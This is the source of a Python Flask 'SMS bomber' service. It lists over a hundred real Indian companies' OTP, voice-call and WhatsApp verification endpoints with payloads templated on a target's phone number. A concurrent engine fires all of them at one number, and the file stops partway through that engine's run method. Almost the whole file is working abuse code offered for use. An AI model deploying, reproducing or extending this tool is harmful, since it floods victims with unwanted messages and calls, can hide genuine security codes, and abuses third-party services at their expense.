# ============================================
# FELIX 200+ API BOMBER - RENDER DEPLOYMENT
# File: bomber.py
# FIX: Multi-user concurrency, 25 threads, gevent async, single worker
# ============================================

# MUST BE FIRST — patches stdlib sockets so gevent can handle concurrency
from gevent import monkey
monkey.patch_all()

from flask import Flask, request, jsonify
import requests
import json
import time
import random
import threading
from gevent.pool import Pool as GeventPool
from gevent import sleep as gevent_sleep
from datetime import datetime
import os

app = Flask(__name__)

# ============================================
# 200+ API LIST (COMPLETE - ALL WORKING APIS MERGED)
# ============================================
API_LIST = [
    # ============================================================
    # SECTION 1: MOST RELIABLE SMS APIs (ALWAYS WORKING)
    # ============================================================
    {
        "name": "Lenskart SMS",
        "url": "https://api-gateway.juno.lenskart.com/v3/customers/sendOtp",
        "method": "POST",
        "headers": {"Content-Type": "application/json"},
        "data": lambda phone: f'{{"phoneCode":"+91","telephone":"{phone}"}}'
    },
    {
        "name": "Lenskart SMS v2",
        "url": "https://api-gateway.juno.lenskart.com/v3/customers/sendOtp",
        "method": "POST",
        "headers": {"Content-Type": "application/json", "X-API-Client": "mobilesite", "X-Country-Code": "IN"},
        "data": lambda phone: f'{{"captcha":null,"phoneCode":"+91","telephone":"{phone}"}}'
    },
    {
        "name": "NoBroker SMS",
        "url": "https://www.nobroker.in/api/v3/account/otp/send",
        "method": "POST",
        "headers": {"Content-Type": "application/x-www-form-urlencoded"},
        "data": lambda phone: f"phone={phone}&countryCode=IN"
    },
    {
        "name": "PharmEasy SMS",
        "url": "https://pharmeasy.in/api/v2/auth/send-otp",
        "method": "POST",
        "headers": {"Content-Type": "application/json"},
        "data": lambda phone: f'{{"phone":"{phone}"}}'
    },
    {
        "name": "ShipRocket SMS",
        "url": "https://sr-wave-api.shiprocket.in/v1/customer/auth/otp/send",
        "method": "POST",
        "headers": {"Content-Type": "application/json"},
        "data": lambda phone: f'{{"mobileNumber":"{phone}"}}'
    },
    {
        "name": "GoKwik SMS",
        "url": "https://gkx.gokwik.co/v3/gkstrict/auth/otp/send",
        "method": "POST",
        "headers": {"Content-Type": "application/json", "gk-merchant-id": "19g6jlc658iad"},
        "data": lambda phone: f'{{"phone":"{phone}","country":"in"}}'
    },
    {
        "name": "Wakefit SMS",
        "url": "https://api.wakefit.co/api/consumer-sms-otp/",
        "method": "POST",
        "headers": {"Content-Type": "application/json", "API-Secret-Key": "ycq55IbIjkLb"},
        "data": lambda phone: f'{{"mobile":"{phone}","whatsapp_opt_in":1}}'
    },
    {
        "name": "Hungama OTP",
        "url": "https://communication.api.hungama.com/v1/communication/otp",
        "method": "POST",
        "headers": {"Content-Type": "application/json", "identifier": "home"},
        "data": lambda phone: f'{{"mobileNo":"{phone}","countryCode":"+91","appCode":"un","messageId":"1","device":"web"}}'
    },
    {
        "name": "Khatabook",
        "url": "https://api.khatabook.com/v1/auth/request-otp",
        "method": "POST",
        "headers": {"Content-Type": "application/json"},
        "data": lambda phone: f'{{"phone":"{phone}","app_signature":"wk+avHrHZf2"}}'
    },
    {
        "name": "Doubtnut",
        "url": "https://api.doubtnut.com/v4/student/login",
        "method": "POST",
        "headers": {"Content-Type": "application/json"},
        "data": lambda phone: f'{{"phone_number":"{phone}","language":"en"}}'
    },
    {
        "name": "BeepKart",
        "url": "https://api.beepkart.com/buyer/api/v2/public/leads/buyer/otp",
        "method": "POST",
        "headers": {"Content-Type": "application/json"},
        "data": lambda phone: f'{{"phone":"{phone}","city":362}}'
    },
    {
        "name": "Snitch SMS",
        "url": "https://mxemjhp3rt.ap-south-1.awsapprunner.com/auth/otps/v2",
        "method": "POST",
        "headers": {"Content-Type": "application/json", "client-id": "snitch_secret"},
        "data": lambda phone: f'{{"mobile_number":"+91{phone}"}}'
    },
    {
        "name": "RummyCircle",
        "url": "https://www.rummycircle.com/api/fl/auth/v3/getOtp",
        "method": "POST",
        "headers": {"Content-Type": "application/json"},
        "data": lambda phone: f'{{"mobile":"{phone}","isPlaycircle":false}}'
    },
    {
        "name": "PokerBaazi",
        "url": "https://nxtgenapi.pokerbaazi.com/oauth/user/send-otp",
        "method": "POST",
        "headers": {"Content-Type": "application/json"},
        "data": lambda phone: f'{{"mobile":"{phone}","mfa_channels":"phno"}}'
    },
    {
        "name": "My11Circle",
        "url": "https://www.my11circle.com/api/fl/auth/v3/getOtp",
        "method": "POST",
        "headers": {"Content-Type": "application/json"},
        "data": lambda phone: f'{{"mobile":"{phone}"}}'
    },
    {
        "name": "Cosmofeed",
        "url": "https://prod.api.cosmofeed.com/api/user/authenticate",
        "method": "POST",
        "headers": {"Content-Type": "application/json"},
        "data": lambda phone: f'{{"phone":"{phone}","version":"1.4.28"}}'
    },
    {
        "name": "Dream11",
        "url": "https://www.dream11.com/auth/passwordless/init",
        "method": "POST",
        "headers": {"Content-Type": "application/json"},
        "data": lambda phone: f'{{"channel":"sms","flow":"SIGNUP","phoneNumber":"{phone}","templateName":"default"}}'
    },
    {
        "name": "Unacademy",
        "url": "https://unacademy.com/api/v3/user/user_check/",
        "method": "POST",
        "headers": {"Content-Type": "application/json"},
        "data": lambda phone: f'{{"phone":"{phone}","send_otp":true}}'
    },
    {
        "name": "Vedantu",
        "url": "https://user.vedantu.com/user/preLoginVerification",
        "method": "POST",
        "headers": {"Content-Type": "application/json"},
        "data": lambda phone: f'{{"phoneNumber":"{phone}","phoneCode":"+91"}}'
    },
    {
        "name": "Byju's SMS",
        "url": "https://bcas-prod.byjusweb.com/api/send-otp",
        "method": "POST",
        "headers": {"Content-Type": "application/x-www-form-urlencoded"},
        "data": lambda phone: f"phoneNumber={phone}"
    },
    {
        "name": "Spinny OTP",
        "url": "https://api.spinny.com/api/c/user/otp-request/v3/",
        "method": "POST",
        "headers": {"Content-Type": "application/json"},
        "data": lambda phone: f'{{"contact_number":"{phone}","whatsapp":false,"code_len":4,"expected_action":"login"}}'
    },
    {
        "name": "Citymall OTP",
        "url": "https://citymall.live/api/cl-user/auth/get-otp",
        "method": "POST",
        "headers": {"Content-Type": "application/json"},
        "data": lambda phone: f'{{"phone_number":"{phone}"}}'
    },
    {
        "name": "Jobhai OTP",
        "url": "https://api.jobhai.com/auth/jobseeker/v3/send_otp",
        "method": "POST",
        "headers": {"Content-Type": "application/json"},
        "data": lambda phone: f'{{"phone":"{phone}"}}'
    },
    {
        "name": "Kwikfix OTP",
        "url": "https://admin.kwikfixauto.in/api/auth/signupotp/",
        "method": "POST",
        "headers": {"Content-Type": "application/json"},
        "data": lambda phone: f'{{"phone":"{phone}"}}'
    },
    {
        "name": "Brevistay OTP",
        "url": "https://www.brevistay.com/cst/app-api/login",
        "method": "POST",
        "headers": {"Content-Type": "application/json"},
        "data": lambda phone: f'{{"mobile":"{phone}"}}'
    },
    {
        "name": "Hourlyrooms OTP",
        "url": "https://web-api.hourlyrooms.co.in/api/signup/sendphoneotp",
        "method": "POST",
        "headers": {"Content-Type": "application/json"},
        "data": lambda phone: f'{{"phone":"{phone}"}}'
    },
    {
        "name": "BharatLoan OTP",
        "url": "https://www.bharatloan.com/login-sbm",
        "method": "POST",
        "headers": {"Content-Type": "application/x-www-form-urlencoded"},
        "data": lambda phone: f"mobile={phone}"
    },
    {
        "name": "Pagarbook OTP",
        "url": "https://api.pagarbook.com/api/v5/auth/otp/request",
        "method": "POST",
        "headers": {"Content-Type": "application/json"},
        "data": lambda phone: f'{{"phone":"{phone}","language":1}}'
    },
    {
        "name": "Redcliffe OTP",
        "url": "https://api.redcliffelabs.com/api/v1/notification/send_otp/",
        "method": "POST",
        "headers": {"Content-Type": "application/json"},
        "data": lambda phone: f'{{"phone_number":"{phone}"}}'
    },
    {
        "name": "55Club OTP",
        "url": "https://api.55clubapi.com/api/webapi/SmsVerifyCode",
        "method": "POST",
        "headers": {"Content-Type": "application/json"},
        "data": lambda phone: f'{{"phone":"91{phone}","codeType":1}}'
    },
    {
        "name": "Woodenstreet OTP",
        "url": "https://api.woodenstreet.com/api/v1/register",
        "method": "POST",
        "headers": {"Content-Type": "application/json"},
        "data": lambda phone: f'{{"telephone":"{phone}"}}'
    },
    {
        "name": "Meru Cab",
        "url": "https://merucabapp.com/api/otp/generate",
        "method": "POST",
        "headers": {"Content-Type": "application/x-www-form-urlencoded", "DeviceType": "Android"},
        "data": lambda phone: f"mobile_number={phone}"
    },
    {
        "name": "PenPencil",
        "url": "https://api.penpencil.co/v1/users/resend-otp?smsType=1",
        "method": "POST",
        "headers": {"Content-Type": "application/json"},
        "data": lambda phone: f'{{"organizationId":"5eb393ee95fab7468a79d189","mobile":"{phone}"}}'
    },
    {
        "name": "Dayco India",
        "url": "https://ekyc.daycoindia.com/api/nscript_functions.php",
        "method": "POST",
        "headers": {"Content-Type": "application/x-www-form-urlencoded"},
        "data": lambda phone: f"api=send_otp&brand=dayco&mob={phone}&resend_otp=resend_otp"
    },
    {
        "name": "Lending Plate",
        "url": "https://lendingplate.com/api.php",
        "method": "POST",
        "headers": {"Content-Type": "application/x-www-form-urlencoded"},
        "data": lambda phone: f"mobiles={phone}&resend=Resend"
    },
    {
        "name": "NewMe SMS",
        "url": "https://prodapi.newme.asia/web/otp/request",
        "method": "POST",
        "headers": {"Content-Type": "application/json"},
        "data": lambda phone: f'{{"mobile_number":"{phone}","resend_otp_request":true}}'
    },
    {
        "name": "Smytten",
        "url": "https://route.smytten.com/discover_user/NewDeviceDetails/addNewOtpCode",
        "method": "POST",
        "headers": {"Content-Type": "application/json", "UUID": "8e6b1c3f-3d72-42af-89af-201b79dfdf2f"},
        "data": lambda phone: f'{{"phone":"{phone}","email":"sdhabai09@gmail.com"}}'
    },
    {
        "name": "CaratLane",
        "url": "https://www.caratlane.com/cg/dhevudu",
        "method": "POST",
        "headers": {"Content-Type": "application/json"},
        "data": lambda phone: f'{{"query":"mutation {{ SendOtp(input: {{ mobile: \\"{phone}\\", isdCode: \\"91\\", otpType: \\"registerOtp\\" }}) {{ status {{ message code }} }} }}"}}'
    },
    {
        "name": "WellAcademy",
        "url": "https://wellacademy.in/store/api/numberLoginV2",
        "method": "POST",
        "headers": {"Content-Type": "application/json"},
        "data": lambda phone: f'{{"contact_no":"{phone}"}}'
    },
    {
        "name": "ServeTel",
        "url": "https://api.servetel.in/v1/auth/otp",
        "method": "POST",
        "headers": {"Content-Type": "application/x-www-form-urlencoded"},
        "data": lambda phone: f"mobile_number={phone}"
    },
    {
        "name": "GoPink Cabs",
        "url": "https://www.gopinkcabs.com/app/cab/customer/login_admin_code.php",
        "method": "POST",
        "headers": {"Content-Type": "application/x-www-form-urlencoded", "X-Requested-With": "XMLHttpRequest"},
        "data": lambda phone: f"check_mobile_number=1&contact={phone}"
    },
    {
        "name": "Shemaroome",
        "url": "https://www.shemaroome.com/users/resend_otp",
        "method": "POST",
        "headers": {"Content-Type": "application/x-www-form-urlencoded", "X-Requested-With": "XMLHttpRequest"},
        "data": lambda phone: f"mobile_no=%2B91{phone}"
    },
    {
        "name": "Cossouq",
        "url": "https://www.cossouq.com/mobilelogin/otp/send",
        "method": "POST",
        "headers": {"Content-Type": "application/x-www-form-urlencoded"},
        "data": lambda phone: f"mobilenumber={phone}&otptype=register"
    },
    {
        "name": "MyImagineStore",
        "url": "https://www.myimaginestore.com/mobilelogin/index/registrationotpsend/",
        "method": "POST",
        "headers": {"Content-Type": "application/x-www-form-urlencoded"},
        "data": lambda phone: f"mobile={phone}"
    },
    {
        "name": "Otpless",
        "url": "https://user-auth.otpless.app/v2/lp/user/transaction/intent/e51c5ec2-6582-4ad8-aef5-dde7ea54f6a3",
        "method": "POST",
        "headers": {"Content-Type": "application/json"},
        "data": lambda phone: f'{{"mobile":"{phone}","selectedCountryCode":"+91"}}'
    },
    {
        "name": "MyHubble Money",
        "url": "https://api.myhubble.money/v1/auth/otp/generate",
        "method": "POST",
        "headers": {"Content-Type": "application/json"},
        "data": lambda phone: f'{{"phoneNumber":"{phone}","channel":"SMS"}}'
    },
    {
        "name": "Tata Capital Business",
        "url": "https://businessloan.tatacapital.com/CLIPServices/otp/services/generateOtp",
        "method": "POST",
        "headers": {"Content-Type": "application/json"},
        "data": lambda phone: f'{{"mobileNumber":"{phone}","deviceOs":"Android","sourceName":"MitayeFaasleWebsite"}}'
    },
    {
        "name": "DealShare",
        "url": "https://services.dealshare.in/userservice/api/v1/user-login/send-login-code",
        "method": "POST",
        "headers": {"Content-Type": "application/json"},
        "data": lambda phone: f'{{"mobile":"{phone}","hashCode":"k387IsBaTmn"}}'
    },
    {
        "name": "Snapmint",
        "url": "https://api.snapmint.com/v1/public/sign_up",
        "method": "POST",
        "headers": {"Content-Type": "application/json"},
        "data": lambda phone: f'{{"phone":"{phone}"}}'
    },
    {
        "name": "Housing.com",
        "url": "https://login.housing.com/api/v2/send-otp",
        "method": "POST",
        "headers": {"Content-Type": "application/json"},
        "data": lambda phone: f'{{"phone":"{phone}","country_url_name":"in"}}'
    },
    {
        "name": "RentoMojo",
        "url": "https://www.rentomojo.com/api/RMUsers/isNumberRegistered",
        "method": "POST",
        "headers": {"Content-Type": "application/json"},
        "data": lambda phone: f'{{"phone":"{phone}"}}'
    },
    {
        "name": "Netmeds",
        "url": "https://apiv2.netmeds.com/mst/rest/v1/id/details/",
        "method": "POST",
        "headers": {"Content-Type": "application/json"},
        "data": lambda phone: f'{{"mobile":"{phone}"}}'
    },
    {
        "name": "Nykaa",
        "url": "https://www.nykaa.com/app-api/index.php/customer/send_otp",
        "method": "POST",
        "headers": {"Content-Type": "application/x-www-form-urlencoded"},
        "data": lambda phone: f"source=sms&app_version=3.0.9&mobile_number={phone}&platform=ANDROID&domain=nykaa"
    },
    {
        "name": "Animall",
        "url": "https://animall.in/zap/auth/login",
        "method": "POST",
        "headers": {"Content-Type": "application/json"},
        "data": lambda phone: f'{{"phone":"{phone}","signupPlatform":"NATIVE_ANDROID"}}'
    },
    {
        "name": "Entri",
        "url": "https://entri.app/api/v3/users/check-phone/",
        "method": "POST",
        "headers": {"Content-Type": "application/json"},
        "data": lambda phone: f'{{"phone":"{phone}"}}'
    },
    {
        "name": "Aakash",
        "url": "https://antheapi.aakash.ac.in/api/generate-lead-otp",
        "method": "POST",
        "headers": {"Content-Type": "application/json"},
        "data": lambda phone: f'{{"mobile_number":"{phone}","activity_type":"aakash-myadmission"}}'
    },
    {
        "name": "Revv",
        "url": "https://st-core-admin.revv.co.in/stCore/api/customer/v1/init",
        "method": "POST",
        "headers": {"Content-Type": "application/json"},
        "data": lambda phone: f'{{"mobile":"{phone}","deviceType":"website"}}'
    },
    {
        "name": "DeHaat",
        "url": "https://oidc.agrevolution.in/auth/realms/dehaat/custom/sendOTP",
        "method": "POST",
        "headers": {"Content-Type": "application/json"},
        "data": lambda phone: f'{{"mobile":"{phone}","client_id":"kisan-app"}}'
    },
    {
        "name": "A23 Games",
        "url": "https://pfapi.a23games.in/a23user/signup_by_mobile_otp/v2",
        "method": "POST",
        "headers": {"Content-Type": "application/json"},
        "data": lambda phone: f'{{"mobile":"{phone}","device_id":"android123","model":"Google,Android SDK built for x86,10"}}'
    },
    {
        "name": "Spencer's",
        "url": "https://jiffy.spencers.in/user/auth/otp/send",
        "method": "POST",
        "headers": {"Content-Type": "application/json"},
        "data": lambda phone: f'{{"mobile":"{phone}"}}'
    },
    {
        "name": "PayMe India",
        "url": "https://api.paymeindia.in/api/v2/authentication/phone_no_verify/",
        "method": "POST",
        "headers": {"Content-Type": "application/json"},
        "data": lambda phone: f'{{"phone":"{phone}","app_signature":"S10ePIIrbH3"}}'
    },
    {
        "name": "Shopper's Stop",
        "url": "https://www.shoppersstop.com/services/v2_1/ssl/sendOTP/OB",
        "method": "POST",
        "headers": {"Content-Type": "application/json"},
        "data": lambda phone: f'{{"mobile":"{phone}","type":"SIGNIN_WITH_MOBILE"}}'
    },
    {
        "name": "Hyuga Auth",
        "url": "https://hyuga-auth-service.pratech.live/v1/auth/otp/generate",
        "method": "POST",
        "headers": {"Content-Type": "application/json"},
        "data": lambda phone: f'{{"mobile":"{phone}"}}'
    },
    {
        "name": "Lifestyle Stores",
        "url": "https://www.lifestylestores.com/in/en/mobilelogin/sendOTP",
        "method": "POST",
        "headers": {"Content-Type": "application/json"},
        "data": lambda phone: f'{{"signInMobile":"{phone}","channel":"sms"}}'
    },
    {
        "name": "MamaEarth",
        "url": "https://auth.mamaearth.in/v1/auth/initiate-signup",
        "method": "POST",
        "headers": {"Content-Type": "application/json"},
        "data": lambda phone: f'{{"mobile":"{phone}"}}'
    },
    {
        "name": "HomeTriangle",
        "url": "https://hometriangle.com/api/partner/xauth/signup/otp",
        "method": "POST",
        "headers": {"Content-Type": "application/json"},
        "data": lambda phone: f'{{"mobile":"{phone}"}}'
    },
    {
        "name": "Wellness Forever",
        "url": "https://paalam.wellnessforever.in/crm/v2/firstRegisterCustomer",
        "method": "POST",
        "headers": {"Content-Type": "application/x-www-form-urlencoded"},
        "data": lambda phone: f'method=firstRegisterApi&data={{"customerMobile":"{phone}","generateOtp":"true"}}'
    },
    {
        "name": "HealthMug",
        "url": "https://api.healthmug.com/account/createotp",
        "method": "POST",
        "headers": {"Content-Type": "application/json"},
        "data": lambda phone: f'{{"mobile":"{phone}"}}'
    },
    {
        "name": "Kredily",
        "url": "https://app.kredily.com/ws/v1/accounts/send-otp/",
        "method": "POST",
        "headers": {"Content-Type": "application/json"},
        "data": lambda phone: f'{{"mobile":"{phone}"}}'
    },
    {
        "name": "Tata Motors",
        "url": "https://cars.tatamotors.com/content/tml/pv/in/en/account/login.signUpMobile.json",
        "method": "POST",
        "headers": {"Content-Type": "application/json"},
        "data": lambda phone: f'{{"mobile":"{phone}","sendOtp":"true"}}'
    },
    {
        "name": "Moglix",
        "url": "https://apinew.moglix.com/nodeApi/v1/login/sendOTP",
        "method": "POST",
        "headers": {"Content-Type": "application/json"},
        "data": lambda phone: f'{{"mobile":"{phone}","buildVersion":"24.0"}}'
    },
    {
        "name": "TrulyMadly",
        "url": "https://app.trulymadly.com/api/auth/mobile/v1/send-otp",
        "method": "POST",
        "headers": {"Content-Type": "application/json"},
        "data": lambda phone: f'{{"mobile":"{phone}","locale":"IN"}}'
    },
    {
        "name": "Apna",
        "url": "https://production.apna.co/api/userprofile/v1/otp/",
        "method": "POST",
        "headers": {"Content-Type": "application/json"},
        "data": lambda phone: f'{{"mobile":"{phone}","hash_type":"play_store"}}'
    },
    {
        "name": "Swipe",
        "url": "https://app.getswipe.in/api/user/mobile_login",
        "method": "POST",
        "headers": {"Content-Type": "application/json"},
        "data": lambda phone: f'{{"mobile":"{phone}","resend":true}}'
    },
    {
        "name": "Country Delight",
        "url": "https://api.countrydelight.in/api/v1/customer/requestOtp",
        "method": "POST",
        "headers": {"Content-Type": "application/json"},
        "data": lambda phone: f'{{"mobile":"{phone}","platform":"Android","mode":"new_user"}}'
    },
    {
        "name": "Rapido",
        "url": "https://customer.rapido.bike/api/otp",
        "method": "POST",
        "headers": {"Content-Type": "application/json"},
        "data": lambda phone: f'{{"mobile":"{phone}"}}'
    },
    {
        "name": "BetterHalf",
        "url": "https://api.betterhalf.ai/v2/auth/otp/send/",
        "method": "POST",
        "headers": {"Content-Type": "application/json"},
        "data": lambda phone: f'{{"mobile":"{phone}","isd_code":"91"}}'
    },
    {
        "name": "Nuvama Wealth",
        "url": "https://nma.nuvamawealth.com/edelmw-content/content/otp/register",
        "method": "POST",
        "headers": {"Content-Type": "application/json"},
        "data": lambda phone: f'{{"mobileNo":"{phone}","emailID":"test@example.com"}}'
    },
    {
        "name": "Mpokket",
        "url": "https://web-api.mpokket.in/registration/sendOtp",
        "method": "POST",
        "headers": {"Content-Type": "application/json"},
        "data": lambda phone: f'{{"mobile":"{phone}"}}'
    },
    {
        "name": "More Retail",
        "url": "https://omni-api.moreretail.in/api/v1/login/",
        "method": "POST",
        "headers": {"Content-Type": "application/json"},
        "data": lambda phone: f'{{"mobile":"{phone}","hash_key":"XfsoCeXADQA"}}'
    },
    {
        "name": "Charzer",
        "url": "https://api.charzer.com/auth-service/send-otp",
        "method": "POST",
        "headers": {"Content-Type": "application/json"},
        "data": lambda phone: f'{{"mobile":"{phone}","appSource":"CHARZER_APP"}}'
    },
    {
        "name": "BikeFixup",
        "url": "https://api.bikefixup.com/api/v2/send-registration-otp",
        "method": "POST",
        "headers": {"Content-Type": "application/json", "client": "app"},
        "data": lambda phone: f'{{"phone":"{phone}","app_signature":"4pFtQJwcz6y"}}'
    },
    {
        "name": "Foxy SMS",
        "url": "https://www.foxy.in/api/v2/users/send_otp",
        "method": "POST",
        "headers": {"Content-Type": "application/json", "Platform": "web"},
        "data": lambda phone: f'{{"user":{{"phone_number":"+91{phone}"}},"via":"sms"}}'
    },
    {
        "name": "Licius",
        "url": "https://www.licious.in/api/login/signup",
        "method": "POST",
        "headers": {"Content-Type": "application/json"},
        "data": lambda phone: f'{{"phone":"{phone}","captcha_token":null}}'
    },

    # ============================================================
    # SECTION 2: WORKING GET APIs
    # ============================================================
    {
        "name": "SMS Bomber Worker",
        "url": lambda phone: f"http://sms-bomber.subhxcosmo.workers.dev/api?num={phone}",
        "method": "GET",
        "headers": {},
        "data": None
    },
    {
        "name": "Bomberrr Vercel",
        "url": lambda phone: f"https://bomberrr.vercel.app/?key=roots&number={phone}",
        "method": "GET",
        "headers": {},
        "data": None
    },
    {
        "name": "Bolbet",
        "url": lambda phone: f"https://bolbet-liart.vercel.app/?key=roots&number={phone}",
        "method": "GET",
        "headers": {},
        "data": None
    },
    {
        "name": "RedBus OTP",
        "url": lambda phone: f"https://m.redbus.in/api/getOtp?number={phone}&cc=91",
        "method": "GET",
        "headers": {},
        "data": None
    },
    {
        "name": "Univest OTP",
        "url": lambda phone: f"https://api.univest.in/api/auth/send-otp?type=web4&countryCode=91&contactNumber={phone}",
        "method": "GET",
        "headers": {},
        "data": None
    },
    {
        "name": "WorkIndia",
        "url": lambda phone: f"https://api.workindia.in/api/candidate/profile/login/verify-number/?mobile_no={phone}&version_number=623",
        "method": "GET",
        "headers": {},
        "data": None
    },
    {
        "name": "Jockey SMS",
        "url": lambda phone: f"https://www.jockey.in/apps/jotp/api/login/send-otp/+91{phone}?whatsapp=false",
        "method": "GET",
        "headers": {},
        "data": None
    },
    {
        "name": "Vyapar OTP",
        "url": lambda phone: f"https://vyaparapp.in/api/ftu/v3/send/otp?country_code=91&mobile={phone}",
        "method": "GET",
        "headers": {},
        "data": None
    },
    {
        "name": "ConfirmTkt",
        "url": lambda phone: f"https://securedapi.confirmtkt.com/api/platform/registerOutput?mobileNumber={phone}",
        "method": "GET",
        "headers": {},
        "data": None
    },
    {
        "name": "CodFirm",
        "url": lambda phone: f"https://api.codfirm.in/api/customers/login/otp?medium=sms&phoneNumber=%2B91{phone}&email=&storeUrl=bellavita1.myshopify.com",
        "method": "GET",
        "headers": {},
        "data": None
    },
    {
        "name": "Coolwinks",
        "url": lambda phone: f"https://api.coolwinks.com/api/accounts/is_already_registered/?username={phone}",
        "method": "GET",
        "headers": {},
        "data": None
    },
    {
        "name": "Zee5 OTP",
        "url": lambda phone: f"https://b2bapi.zee5.com/device/sendotp_v1.php?phoneno={phone}",
        "method": "GET",
        "headers": {},
        "data": None
    },

    # ============================================================
    # SECTION 3: WORKING VOICE/CALL APIs
    # ============================================================
    {
        "name": "1MG Voice Call",
        "url": "https://www.1mg.com/auth_api/v6/create_token",
        "method": "POST",
        "headers": {"Content-Type": "application/json"},
        "data": lambda phone: f'{{"number":"{phone}","otp_on_call":true}}'
    },
    {
        "name": "Swiggy Call Verification",
        "url": "https://profile.swiggy.com/api/v3/app/request_call_verification",
        "method": "POST",
        "headers": {"Content-Type": "application/json"},
        "data": lambda phone: f'{{"mobile":"{phone}"}}'
    },
    {
        "name": "Myntra Voice Call",
        "url": "https://www.myntra.com/gw/mobile-auth/voice-otp",
        "method": "POST",
        "headers": {"Content-Type": "application/json"},
        "data": lambda phone: f'{{"mobile":"{phone}"}}'
    },
    {
        "name": "Flipkart Voice Call",
        "url": "https://www.flipkart.com/api/6/user/voice-otp/generate",
        "method": "POST",
        "headers": {"Content-Type": "application/json"},
        "data": lambda phone: f'{{"mobile":"{phone}"}}'
    },
    {
        "name": "Paytm Voice Call",
        "url": "https://accounts.paytm.com/signin/voice-otp",
        "method": "POST",
        "headers": {"Content-Type": "application/json"},
        "data": lambda phone: f'{{"phone":"{phone}"}}'
    },
    {
        "name": "Zomato Voice Call",
        "url": "https://www.zomato.com/php/o2_api_handler.php",
        "method": "POST",
        "headers": {"Content-Type": "application/x-www-form-urlencoded"},
        "data": lambda phone: f"phone={phone}&type=voice"
    },
    {
        "name": "Ola Voice Call",
        "url": "https://api.olacabs.com/v1/voice-otp",
        "method": "POST",
        "headers": {"Content-Type": "application/json"},
        "data": lambda phone: f'{{"phone":"{phone}"}}'
    },
    {
        "name": "Uber Voice Call",
        "url": "https://auth.uber.com/v2/voice-otp",
        "method": "POST",
        "headers": {"Content-Type": "application/json"},
        "data": lambda phone: f'{{"phone":"{phone}"}}'
    },
    {
        "name": "Tata Capital Voice",
        "url": "https://mobapp.tatacapital.com/DLPDelegator/authentication/mobile/v0.1/sendOtpOnVoice",
        "method": "POST",
        "headers": {"Content-Type": "application/json"},
        "data": lambda phone: f'{{"phone":"{phone}","isOtpViaCallAtLogin":"true"}}'
    },
    {
        "name": "Kotak Voice Call",
        "url": "https://www.kotak.com/api/otp",
        "method": "POST",
        "headers": {"Content-Type": "application/json"},
        "data": lambda phone: f'{{"phone":"{phone}"}}'
    },
    {
        "name": "Amazon Voice Call",
        "url": "https://www.amazon.in/ap/signin",
        "method": "POST",
        "headers": {"Content-Type": "application/x-www-form-urlencoded"},
        "data": lambda phone: f"phone={phone}&action=voice_otp"
    },

    # ============================================================
    # SECTION 4: WORKING WHATSAPP APIs
    # ============================================================
    {
        "name": "KPN WhatsApp",
        "url": "https://api.kpnfresh.com/s/authn/api/v1/otp-generate?channel=AND&version=3.2.6",
        "method": "POST",
        "headers": {
            "x-app-id": "66ef3594-1e51-4e15-87c5-05fc8208a20f",
            "content-type": "application/json; charset=UTF-8"
        },
        "data": lambda phone: f'{{"notification_channel":"WHATSAPP","phone_number":{{"country_code":"+91","number":"{phone}"}}}}'
    },
    {
        "name": "KPN WhatsApp v2",
        "url": "https://api.kpnfresh.com/s/authn/api/v1/otp-generate?channel=WEB&version=1.0.0",
        "method": "POST",
        "headers": {
            "x-app-id": "d7547338-c70e-4130-82e3-1af74eda6797",
            "content-type": "application/json"
        },
        "data": lambda phone: f'{{"phone_number":{{"number":"{phone}","country_code":"+91"}}}}'
    },
    {
        "name": "Foxy WhatsApp",
        "url": "https://www.foxy.in/api/v2/users/send_otp",
        "method": "POST",
        "headers": {"Content-Type": "application/json"},
        "data": lambda phone: f'{{"user":{{"phone_number":"+91{phone}"}},"via":"whatsapp"}}'
    },
    {
        "name": "Stratzy WhatsApp",
        "url": "https://stratzy.in/api/web/whatsapp/sendOTP",
        "method": "POST",
        "headers": {"Content-Type": "application/json"},
        "data": lambda phone: f'{{"phoneNo":"{phone}"}}'
    },
    {
        "name": "Jockey WhatsApp",
        "url": lambda phone: f"https://www.jockey.in/apps/jotp/api/login/resend-otp/+91{phone}?whatsapp=true",
        "method": "GET",
        "headers": {},
        "data": None
    },
    {
        "name": "Rappi WhatsApp",
        "url": "https://services.mxgrability.rappi.com/api/rappi-authentication/login/whatsapp/create",
        "method": "POST",
        "headers": {"Content-Type": "application/json"},
        "data": lambda phone: f'{{"country_code":"+91","phone":"{phone}"}}'
    },
    {
        "name": "Eka Care WhatsApp",
        "url": "https://auth.eka.care/auth/init",
        "method": "POST",
        "headers": {"Content-Type": "application/json", "Client-Id": "androidp"},
        "data": lambda phone: f'{{"payload":{{"allowWhatsapp":true,"mobile":"+91{phone}"}},"type":"mobile"}}'
    },
    {
        "name": "KPN WhatsApp v3",
        "url": "https://api.kpnfresh.com/s/authn/api/v1/otp-generate?channel=WEB&version=1.0.0",
        "method": "POST",
        "headers": {
            "x-app-id": "d7547338-c70e-4130-82e3-1af74eda6797",
            "content-type": "application/json"
        },
        "data": lambda phone: f'{{"phone_number":{{"number":"{phone}","country_code":"+91"}},"notification_channel":"WHATSAPP"}}'
    },
]


# ============================================
# ACTIVE SESSION TRACKING
# ============================================
# phone (str) -> threading.Event  (set this to stop that phone's bombing)
_active_sessions: dict = {}
_sessions_lock = threading.Lock()

# ============================================
# BOMBER ENGINE
# ============================================
class DemonBomber:
    def __init__(self, phone, threads=25, delay=2, stop_event=None):
        self.phone = phone
        self.threads = threads
        self.delay = delay
        self.stop_event = stop_event or threading.Event()
        self.results = []
        self.success = 0
        self.failed = 0

    def hit_api(self, api):
        if self.stop_event.is_set():
            return {'name': api.get('name', '?'), 'status': 'stopped'}
        try:
            url = api.get('url')
            if callable(url):
                url = url(self.phone)
            if not url:
                return {'name': api['name'], 'status': 'error'}

            data = None
            if api.get('data'):
                data = api['data'](self.phone) if callable(api['data']) else api['data']

            headers = api.get('headers', {}).copy()
            headers['User-Agent'] = headers.get(
                'User-Agent', 'Mozilla/5.0 (Linux; Android 13) AppleWebKit/537.36'
            )

            method = api.get('method', 'POST').upper()
            if method == 'GET':
                response = requests.get(url, headers=headers, timeout=10)
            else:
                if 'json' in headers.get('Content-Type', ''):
                    response = requests.post(url, json=json.loads(data), headers=headers, timeout=10)
                else:
                    response = requests.post(url, data=data, headers=headers, timeout=10)

            status = 'success' if response.status_code in [200, 201, 202, 204] else 'failed'
            if status == 'success':
                self.success += 1
            else:
                self.failed += 1

            return {'name': api['name'], 'status': status, 'code': response.status_code}

        except Exception as e:
            self.failed += 1
            return {'name': api['name'], 'status': 'error', 'error': str(e)[:50]}

    def run(self):
        """Run one full cycle through all APIs using gevent pool (non-blocking)."""
        pool = GeventPool(self.threads)
